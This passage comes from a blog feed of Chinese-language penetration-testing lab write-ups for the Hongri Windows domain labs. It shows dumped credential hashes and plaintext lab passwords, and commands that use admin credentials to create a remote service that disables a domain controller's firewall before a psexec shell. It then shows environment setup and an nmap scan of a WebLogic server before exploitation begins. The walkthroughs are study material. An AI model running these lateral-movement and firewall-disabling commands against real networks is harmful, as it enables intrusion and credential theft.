</span></span><span style="display:flex;"><span>Username       Domain   LM                                NTLM                              SHA1
</span></span><span style="display:flex;"><span>--------       ------   --                                ----                              ----
</span></span><span style="display:flex;"><span>Administrator  TEST     fc5d63d71569f04399b419bc76e2eb34  18edd0cc3227be3bf61ce198835a1d97  0f058e319f079c15fe3449bbeffc086cfa4d231e
</span></span><span style="display:flex;"><span>Administrator  WIN2008  ae946ec6f4ca785b93371dee1d5ee7e6  31c1794c5aa8547c87a8bcd0324b8337  128c0272959b85b330090611169d07d85cb6bd0b
</span></span><span style="display:flex;"><span>WIN2008$       TEST                                       c47b1f47431b259861e615472864c698  5a09ade7dca624916c39473fd609c22302dd33bc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>wdigest credentials
</span></span><span style="display:flex;"><span><span style="color:#f92672">===================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Username       Domain   Password
</span></span><span style="display:flex;"><span>--------       ------   --------
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>         <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>   <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Administrator  TEST     zxcASDqw123!!
</span></span><span style="display:flex;"><span>Administrator  WIN2008  123qwe!ASD
</span></span><span style="display:flex;"><span>WIN2008$       TEST     <span style="color:#ae81ff">94</span> 1f <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">44</span> 5a 0c 6d 4d dd a9 9d <span style="color:#ae81ff">09</span> 7a d0 <span style="color:#ae81ff">72</span> bb e9 <span style="color:#ae81ff">81</span> <span style="color:#ae81ff">69</span> 7e <span style="color:#ae81ff">96</span> 9f <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">74</span> f2 9e d3 f2 <span style="color:#ae81ff">98</span> <span style="color:#ae81ff">74</span> 7a 2f <span style="color:#ae81ff">49</span> 4e b7 <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">01</span> e5 <span style="color:#ae81ff">94</span> <span style="color:#ae81ff">75</span> 8f <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">44</span> d4 <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">17</span>   
</span></span><span style="display:flex;"><span>                        <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">25</span> 2a d4 <span style="color:#ae81ff">96</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">95</span> <span style="color:#ae81ff">87</span> ec <span style="color:#ae81ff">34</span> e8 <span style="color:#ae81ff">96</span> <span style="color:#ae81ff">74</span> 8f b6 0a ef <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">17</span> af 2e 5b <span style="color:#ae81ff">08</span> f7 6c 4e ad 9c 3e b0 e1 c8 2f 8f bd e3 b2 e7 <span style="color:#ae81ff">81</span> <span style="color:#ae81ff">17</span> <span style="color:#ae81ff">09</span> <span style="color:#ae81ff">96</span> f6 <span style="color:#ae81ff">75</span> b5 0d   
</span></span><span style="display:flex;"><span>                        c1 e1 <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">07</span> d2 a8 <span style="color:#ae81ff">99</span> e5 5f 7d e9 0c <span style="color:#ae81ff">76</span> a3 7e <span style="color:#ae81ff">51</span> e5 f1 d0 f0 da c5 0c <span style="color:#ae81ff">88</span> d0 1c <span style="color:#ae81ff">59</span> <span style="color:#ae81ff">34</span> b9 3e <span style="color:#ae81ff">14</span> ab a1 7b <span style="color:#ae81ff">56</span> cd 9d <span style="color:#ae81ff">67</span> d3 <span style="color:#ae81ff">19</span> c7 ad d9 b2 8d <span style="color:#ae81ff">72</span> e9   
</span></span><span style="display:flex;"><span>                        2a c2 d0 be ff e7 e7 d2 <span style="color:#ae81ff">60</span> <span style="color:#ae81ff">85</span> 9a <span style="color:#ae81ff">99</span> <span style="color:#ae81ff">74</span> 8c d5 0a b5 1c <span style="color:#ae81ff">58</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">28</span> de <span style="color:#ae81ff">15</span> <span style="color:#ae81ff">51</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">58</span> 8a da 3a db <span style="color:#ae81ff">61</span> 5d be f9 d5 b8 a8 5c fe <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">06</span> f6 ac ac <span style="color:#ae81ff">26</span> 6d <span style="color:#ae81ff">22</span>   
</span></span><span style="display:flex;"><span>                        <span style="color:#ae81ff">80</span> e3 f4 f6 <span style="color:#ae81ff">49</span> f8 <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">78</span> 9b a7 <span style="color:#ae81ff">36</span> 6d f7 c4 <span style="color:#ae81ff">10</span> a3 8e <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">83</span> c5 <span style="color:#ae81ff">84</span> ff 3f fc 9c <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">81</span> 2d <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">42</span> 8a <span style="color:#ae81ff">30</span> 5a 7e ca ee 3f <span style="color:#ae81ff">50</span> 0b c8 c6 <span style="color:#ae81ff">68</span> a8 <span style="color:#ae81ff">24</span> cc c0 <span style="color:#ae81ff">52</span>   
</span></span><span style="display:flex;"><span>                        5e b8 <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">30</span> b7
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>tspkg credentials
</span></span><span style="display:flex;"><span><span style="color:#f92672">=================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Username       Domain   Password
</span></span><span style="display:flex;"><span>--------       ------   --------
</span></span><span style="display:flex;"><span>Administrator  TEST     zxcASDqw123!!
</span></span><span style="display:flex;"><span>Administrator  WIN2008  123qwe!ASD
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>kerberos credentials
</span></span><span style="display:flex;"><span><span style="color:#f92672">====================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Username       Domain    Password
</span></span><span style="display:flex;"><span>--------       ------    --------
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>         <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>    <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Administrator  TEST.ORG  zxcASDqw123!!
</span></span><span style="display:flex;"><span>Administrator  WIN2008   123qwe!ASD
</span></span><span style="display:flex;"><span>win2008$       TEST.ORG  <span style="color:#ae81ff">94</span> 1f <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">44</span> 5a 0c 6d 4d dd a9 9d <span style="color:#ae81ff">09</span> 7a d0 <span style="color:#ae81ff">72</span> bb e9 <span style="color:#ae81ff">81</span> <span style="color:#ae81ff">69</span> 7e <span style="color:#ae81ff">96</span> 9f <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">74</span> f2 9e d3 f2 <span style="color:#ae81ff">98</span> <span style="color:#ae81ff">74</span> 7a 2f <span style="color:#ae81ff">49</span> 4e b7 <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">01</span> e5 <span style="color:#ae81ff">94</span> <span style="color:#ae81ff">75</span> 8f <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">44</span> d4 <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">17</span>  
</span></span><span style="display:flex;"><span>                          <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">25</span> 2a d4 <span style="color:#ae81ff">96</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">95</span> <span style="color:#ae81ff">87</span> ec <span style="color:#ae81ff">34</span> e8 <span style="color:#ae81ff">96</span> <span style="color:#ae81ff">74</span> 8f b6 0a ef <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">17</span> af 2e 5b <span style="color:#ae81ff">08</span> f7 6c 4e ad 9c 3e b0 e1 c8 2f 8f bd e3 b2 e7 <span style="color:#ae81ff">81</span> <span style="color:#ae81ff">17</span> <span style="color:#ae81ff">09</span> <span style="color:#ae81ff">96</span> f6 <span style="color:#ae81ff">75</span> b5 <span style="color:#ae81ff">0</span>  
</span></span><span style="display:flex;"><span>                         d c1 e1 <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">07</span> d2 a8 <span style="color:#ae81ff">99</span> e5 5f 7d e9 0c <span style="color:#ae81ff">76</span> a3 7e <span style="color:#ae81ff">51</span> e5 f1 d0 f0 da c5 0c <span style="color:#ae81ff">88</span> d0 1c <span style="color:#ae81ff">59</span> <span style="color:#ae81ff">34</span> b9 3e <span style="color:#ae81ff">14</span> ab a1 7b <span style="color:#ae81ff">56</span> cd 9d <span style="color:#ae81ff">67</span> d3 <span style="color:#ae81ff">19</span> c7 ad d9 b2 8d <span style="color:#ae81ff">72</span>   
</span></span><span style="display:flex;"><span>                         e9 2a c2 d0 be ff e7 e7 d2 <span style="color:#ae81ff">60</span> <span style="color:#ae81ff">85</span> 9a <span style="color:#ae81ff">99</span> <span style="color:#ae81ff">74</span> 8c d5 0a b5 1c <span style="color:#ae81ff">58</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">28</span> de <span style="color:#ae81ff">15</span> <span style="color:#ae81ff">51</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">58</span> 8a da 3a db <span style="color:#ae81ff">61</span> 5d be f9 d5 b8 a8 5c fe <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">06</span> f6 ac ac <span style="color:#ae81ff">26</span> 6d  
</span></span><span style="display:flex;"><span>                          <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">80</span> e3 f4 f6 <span style="color:#ae81ff">49</span> f8 <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">78</span> 9b a7 <span style="color:#ae81ff">36</span> 6d f7 c4 <span style="color:#ae81ff">10</span> a3 8e <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">83</span> c5 <span style="color:#ae81ff">84</span> ff 3f fc 9c <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">81</span> 2d <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">42</span> 8a <span style="color:#ae81ff">30</span> 5a 7e ca ee 3f <span style="color:#ae81ff">50</span> 0b c8 c6 <span style="color:#ae81ff">68</span> a8 <span style="color:#ae81ff">24</span> cc c  
</span></span><span style="display:flex;"><span>                         <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">52</span> 5e b8 <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">30</span> b7
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; 
</span></span></code></pre></div><p>接下来就是尝试登录域控</p>
<h3 id="关闭域控防火墙并拿到session">关闭域控防火墙并拿到session</h3>
<p>这里先使用win7的session来关闭win2012域控机器的防火墙</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net use <span style="color:#ae81ff">\\</span>192.168.93.10<span style="color:#ae81ff">\i</span>pc$ <span style="color:#e6db74">&#34;zxcASDqw123!!&#34;</span> /user:<span style="color:#e6db74">&#34;Administrator&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sc <span style="color:#ae81ff">\\</span>192.168.93.10 create unablefirewall binpath<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;netsh advfirewall set allprofiles state off&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sc <span style="color:#ae81ff">\\</span>192.168.93.10 start unablefirewall
</span></span></code></pre></div><p>然后在使用msf的psexec模块拿shell
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_18.png" alt=""  /></p>
<p>发现还有不少东西要学,win和linux的免杀,win域渗透,权限维持&hellip;.我还要继续学下去吗,已经沉没的比较多了
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_19.png" alt=""  /></p>
<p>最后偷一张拓扑图
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_20.png" alt=""  /></p>
<h1 id="引用">引用</h1>
<p><a href="https://blog.csdn.net/qq_47289634/article/details/132021341" target="_blank" rel="noopener nofollow noreferrer" >https://blog.csdn.net/qq_47289634/article/details/132021341</a></p>
<p><a href="https://blog.csdn.net/2301_76227305/article/details/139067562" target="_blank" rel="noopener nofollow noreferrer" >https://blog.csdn.net/2301_76227305/article/details/139067562</a></p>
<p><a href="https://www.bilibili.com/read/cv33395770/" target="_blank" rel="noopener nofollow noreferrer" >https://www.bilibili.com/read/cv33395770/</a></p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/win" term="sec/win" label="sec/win" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[红日靶场2_win域]]></title>
            <link href="https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/" rel="alternate" type="text/html" />
            
                <id>https://l1uyun.one/posts/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/</id>
            
            
            <published>2024-09-28T11:10:12+08:00</published>
            <updated>2024-11-24T18:41:52+08:00</updated>
            
            
            <content type="html"><![CDATA[<h1 id="前言">前言</h1>
<p>环境和红日1的环境搭建差不多，不过这次给三台机器分别是域控、web服务器、个人PC机，与红日1不同的是这里将域管换成了个人PC机，因此我们的一些操作也会有所不同</p>
<h1 id="红日靶场2_win域">红日靶场2_win域</h1>
<h2 id="搭建环境">搭建环境</h2>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_1.png" alt=""  /></p>
<pre tabindex="0"><code>administrator
1qaz@WSX
默认密码都是1qaz@WSX
</code></pre><p>这里需要模拟内网环境,所以需要弄一个内网网卡</p>
<p>创建一个vmnet2
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_2.png" alt=""  /></p>
<p>然后把三台机器的网卡2都改成这个vmnet2就行了
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_3.png" alt=""  />
DC机器不需要做什么处理,改完网卡直接启动就行</p>
<p>这里的另外一个网卡,作者设置的是111网段,但是我习惯了自己的ip,所以选择改pc和web两台机器里面的ip</p>
<p>先改一下pc这台机器,这台先改下ip
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_4.png" alt=""  />
再测试一下连通性,使用外部的parrot机器ping一下,没通,需要关闭防火墙
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_5.png" alt=""  /></p>
<p>最后配置web机器,web机器需要先将恢复快照1.3版本
会出现一个报错,直接点放弃就行,<strong>这里恢复快照之后,需要重新改网卡,怪不得ping不通域控的</strong></p>
<p>登录本地用户</p>
<pre tabindex="0"><code>.\de1ay
1qaz@WSX
</code></pre><p>这里提示需要修改密码,我改成1qaz@WSX3
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_6.png" alt=""  />
进去之后直接注销掉,切换成域用户mssql,密码还是1qaz@WSX</p>
<p>然后还是先改ip
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_7.png" alt=""  /></p>
<p>改完之后测试一下两个网段都能不能ping通</p>
<p>ping不通的话得关一下web的防火墙,关掉之后就能ping通了
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_8.png" alt=""  /></p>
<p>红日1是以phpstudy搭的一个web服务，红日2用的是weblogic。web服务中，我们需要手动打开weblogic</p>
<p>进入这个路径<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>,没权限的时候,输管理员凭据就行.
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_9.png" alt=""  />
以管理员身份启动一下weblogic
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_10.png" alt=""  /></p>
<p>搭建时参考的文章提到:
WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、Workstation、Computer Browser 全部启动（Computer Browser 是关闭的,导致 net view 显示 6118 error 没能解决，在域信息收集时暂时关闭一下防火墙）</p>
<p>我这里web里的Computer Browser是关闭的,我手动打开了,pc机器是正常的.</p>
<p>访问192.168.3.80:7001/console,跳转进去登录页面,环境搭建成功
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_11.png" alt=""  /></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>web 192.168.3.80
</span></span><span style="display:flex;"><span>pc  192.168.3.201
</span></span><span style="display:flex;"><span>win 192.168.3.99
</span></span><span style="display:flex;"><span>wsl kali 192.168.3.100 
</span></span></code></pre></div><h2 id="外网">外网</h2>
<h3 id="信息收集">信息收集</h3>
<p>先处理web机器</p>
<p>端口扫描出来了不少端口,使用awk做一下处理,提取一下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>awk -F <span style="color:#e6db74">&#39;/&#39;</span>  <span style="color:#e6db74">&#39;BEGIN {ORS=&#34;,&#34;} {print $1}&#39;</span> a.txt
</span></span></code></pre></div><p>进行-A扫描</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>⇒  sudo nmap -Pn -sT 192.168.3.80  -p80,135,139,445,1433,3389,7001,49152,49153,49154,60966,63624,63632,63634 -A  --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-28 19:40 EDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.3.80
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00057s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE            VERSION
</span></span><span style="display:flex;"><span>80/tcp    open  http               Microsoft IIS httpd 7.5
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/7.5
</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title.
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds       Windows Server <span style="color:#ae81ff">2008</span> R2 Standard <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> microsoft-ds
</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s           Microsoft SQL Server <span style="color:#ae81ff">2008</span> R2 10.50.4000.00; SP2
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
</span></span><span style="display:flex;"><span>| Not valid before: 2024-09-28T03:49:00
</span></span><span style="display:flex;"><span>|_Not valid after:  2054-09-28T03:49:00
</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info: 
</span></span><span style="display:flex;"><span>|   192.168.3.80:1433:
</span></span><span style="display:flex;"><span>|     Target_Name: DE1AY
</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: DE1AY
</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: WEB
</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: de1ay.com
</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: WEB.de1ay.com
</span></span><span style="display:flex;"><span>|     DNS_Tree_Name: de1ay.com
</span></span><span style="display:flex;"><span>|_    Product_Version: 6.1.7601
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-09-28T23:42:32+00:00; 0s from scanner time.
</span></span><span style="display:flex;"><span>| ms-sql-info:
</span></span><span style="display:flex;"><span>|   192.168.3.80:1433:
</span></span><span style="display:flex;"><span>|     Version:
</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2008</span> R2 SP2
</span></span><span style="display:flex;"><span>|       number: 10.50.4000.00
</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2008</span> R2
</span></span><span style="display:flex;"><span>|       Service pack level: SP2
</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
</span></span><span style="display:flex;"><span>|_    TCP port: <span style="color:#ae81ff">1433</span>
</span></span><span style="display:flex;"><span>3389/tcp  open  ssl/ms-wbt-server?
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>WEB.de1ay.com
</span></span><span style="display:flex;"><span>| Not valid before: 2024-09-27T03:21:26
</span></span><span style="display:flex;"><span>|_Not valid after:  2025-03-29T03:21:26
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-09-28T23:42:32+00:00; 0s from scanner time.
</span></span><span style="display:flex;"><span>| rdp-ntlm-info:
</span></span><span style="display:flex;"><span>|   Target_Name: DE1AY
</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: DE1AY
</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: WEB
</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: de1ay.com
</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: WEB.de1ay.com
</span></span><span style="display:flex;"><span>|   DNS_Tree_Name: de1ay.com
</span></span><span style="display:flex;"><span>|   Product_Version: 6.1.7601
</span></span><span style="display:flex;"><span>|_  System_Time: 2024-09-28T23:42:27+00:00
</span></span><span style="display:flex;"><span>7001/tcp  open  http               Oracle WebLogic Server 10.3.6.0 <span style="color:#f92672">(</span>Servlet 2.5; JSP 2.1; T3 enabled<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_weblogic-t3-info: T3 protocol in use <span style="color:#f92672">(</span>WebLogic version: 10.3.6.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Error 404--Not Found
</span></span><span style="display:flex;"><span>49152/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49153/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49154/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span>60966/tcp open  ms-sql-s           Microsoft SQL Server <span style="color:#ae81ff">2008</span> R2 10.50.4000.00; SP2
</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info:
</span></span><span style="display:flex;"><span>|   192.168.3.80:60966:
</span></span><span style="display:flex;"><span>|     Target_Name: DE1AY
</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: DE1AY
</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: WEB
</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: de1ay.com
</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: WEB.de1ay.com
</span></span><span style="display:flex;"><span>|     DNS_Tree_Name: de1ay.com
</span></span><span style="display:flex;"><span>|_    Product_Version: 6.1.7601
</span></span><span style="display:flex;"><span>| ms-sql-info:
</span></span><span style="display:flex;"><span>|   192.168.3.80:60966:
</span></span><span style="display:flex;"><span>|     Version:
</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2008</span> R2 SP2
</span></span><span style="display:flex;"><span>|       number: 10.50.4000.00
</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2008</span> R2
</span></span><span style="display:flex;"><span>|       Service pack level: SP2
</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
</span></span><span style="display:flex;"><span>|_    TCP port: <span style="color:#ae81ff">60966</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
</span></span><span style="display:flex;"><span>| Not valid before: 2024-09-28T03:49:00
</span></span><span style="display:flex;"><span>|_Not valid after:  2054-09-28T03:49:00
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-09-28T23:42:32+00:00; 0s from scanner time.
</span></span><span style="display:flex;"><span>63624/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span>63632/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span>63634/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span>MAC Address: 00:0C:29:42:36:4C <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
</span></span><span style="display:flex;"><span>Device type: general purpose
</span></span><span style="display:flex;"><span>Running: Microsoft Windows Vista|7|8.1
</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_8.1
</span></span><span style="display:flex;"><span>OS details: Microsoft Windows Vista, Windows <span style="color:#ae81ff">7</span> SP1, or Windows 8.1 Update <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">1</span> hop
</span></span><span style="display:flex;"><span>Service Info: OSs: Windows, Windows Server <span style="color:#ae81ff">2008</span> R2 - 2012; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb2-time:
</span></span><span style="display:flex;"><span>|   date: 2024-09-28T23:42:27
</span></span><span style="display:flex;"><span>|_  start_date: 2024-09-28T03:48:57
</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: WEB, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:42:36:4c <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| smb-security-mode:
</span></span><span style="display:flex;"><span>|   account_used: &lt;blank&gt;
</span></span><span style="display:flex;"><span>|   authentication_level: user
</span></span><span style="display:flex;"><span>|   challenge_response: supported
</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_clock-skew: mean: -53m19s, deviation: 2h39m59s, median: 0s
</span></span><span style="display:flex;"><span>| smb-os-discovery:
</span></span><span style="display:flex;"><span>|   OS: Windows Server <span style="color:#ae81ff">2008</span> R2 Standard <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2008</span> R2 Standard 6.1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
</span></span><span style="display:flex;"><span>|   Computer name: WEB
</span></span><span style="display:flex;"><span>|   NetBIOS computer name: WEB<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
</span></span><span style="display:flex;"><span>|   Domain name: de1ay.com
</span></span><span style="display:flex;"><span>|   Forest name: de1ay.com
</span></span><span style="display:flex;"><span>|   FQDN: WEB.de1ay.com
</span></span><span style="display:flex;"><span>|_  System time: 2024-09-29T07:42:27+08:00
</span></span><span style="display:flex;"><span>| smb2-security-mode:
</span></span><span style="display:flex;"><span>|   2:1:0:
</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TRACEROUTE
</span></span><span style="display:flex;"><span>HOP RTT     ADDRESS
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   0.57 ms 192.168.3.80
</span></span></code></pre></div><p>这里的web端口是7001的weblogic</p>
<h3 id="weblogic_1036_利用">weblogic_10.3.6_利用</h3>
<p>最后一个复现的漏洞的影响版本里面就有这个10.3.6,先测测这个(好吧,vulhub上weblogic的那几个漏洞基本上都有10.3.6.0)
